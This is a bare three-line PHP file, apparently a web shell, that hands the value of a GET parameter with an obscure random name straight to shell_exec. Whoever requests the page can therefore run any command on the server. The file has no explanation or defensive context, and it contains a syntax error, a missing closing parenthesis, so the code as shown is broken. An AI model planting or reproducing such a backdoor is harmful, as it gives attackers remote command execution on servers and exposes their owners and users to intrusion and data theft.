<?php
shell_exec($_GET['J48fToe2'];
?>
